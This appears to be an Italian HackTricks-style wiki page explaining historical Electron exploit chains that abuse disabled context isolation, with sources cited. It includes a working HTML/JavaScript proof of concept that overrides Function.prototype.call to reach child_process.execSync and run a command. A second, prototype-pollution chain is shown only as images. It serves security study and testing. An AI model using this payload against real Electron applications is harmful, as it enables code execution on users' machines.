# RCE tramite isolamento del contesto di Electron attraverso codice interno

{{#include ../../banners/hacktricks-training.md}}

Questi sono **pattern di exploit storici** per applicazioni Electron che eseguivano contenuti renderer non attendibili senza isolamento del contesto. L’isolamento del contesto è abilitato per impostazione predefinita da Electron 12 ed è tuttora un’impostazione di sicurezza consigliata.<sup>[[1]](#references)</sup> I dettagli interni variano in base alla versione di Electron e Node.js, quindi riproduci la catena usando le versioni incluse nell’applicazione target.

## Esempio 1: sovrascrivere `Function.prototype.call`

Questo esempio è tratto dalla presentazione di Masato Kinugawa a CureCon.<sup>[[2]](#references)</sup>

Nella versione storica di Electron interessata, il codice interno di ASAR registrava un listener per l’evento `exit` del processo. Poiché il codice della pagina e quello interno di Electron condividevano i prototipi JavaScript quando l’isolamento del contesto era disabilitato, il codice renderer poteva sostituire `Function.prototype.call` prima dell’esecuzione del listener interno.<sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>

```javascript
process.on("exit", function () {
  for (let p in cachedArchives) {
    if (!hasProp.call(cachedArchives, p)) continue
    cachedArchives[p].destroy()
  }
})
```

![Percorso del codice interno di Electron asar.js usato nell'esempio di RCE con contextIsolation](<../../images/image (1070).png>)

Il listener è stato gestito tramite il meccanismo degli eventi di Node.js. La pagina originale rimandava a un percorso obsoleto `bin/events.js`; il sorgente corrispondente nel commit storico è invece in `lib/events.js`.<sup>[[5]](#references)</sup>

![Percorso del codice di Node events.js raggiunto dalla catena di RCE con contextIsolation di Electron](<../../images/image (793).png>)

In questo percorso, `self` è l'oggetto process di Node.js:

![RCE con contextIsolation di Electron tramite codice interno di Electron - Esempio 1: dove "self" è l'oggetto process di Node](<../../images/image (700).png>)

L'oggetto process storico esponeva un percorso verso `require`:

```
process.mainModule.require
```

Poiché il dispatcher del listener invocava l’handler con l’oggetto process, sovrascrivendo `call` era possibile recuperare quell’oggetto ed eseguire un comando nativo:

```html
<script>
  Function.prototype.call = function (process) {
    process.mainModule.require("child_process").execSync("calc")
  }
  location.reload() // Trigger the listener during navigation
</script>
```

## Example 2: prototype pollution

La presentazione ElectroVolt mostra un'altra catena storica che ottiene un oggetto `require` tramite prototype pollution.<sup>[[4]](#references)</sup>

Leak:

<figure><img src="../../images/image (279).png" alt=""><figcaption></figcaption></figure>

Exploit:

<figure><img src="../../images/image (89).png" alt=""><figcaption></figcaption></figure>

## References

- [1] [Electron documentation - Context isolation](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
- [2] [Electron: Abusing the lack of context isolation - CureCon](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=41)
- [3] [Electron historical source - lib/common/asar.js](https://github.com/electron/electron/blob/664c184fcb98bb5b4b6b569553e7f7339d3ba4c5/lib/common/asar.js#L30-L36)
- [4] [ElectroVolt: Pwning Popular Desktop Apps While Uncovering New Attack Surface on Electron](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [5] [Node.js historical source - `lib/events.js` listener dispatch](https://github.com/nodejs/node/blob/8a44289089a08b7b19fa3c4651b5f1f5d1edd71b/lib/events.js#L156-L231)
{{#include ../../banners/hacktricks-training.md}}
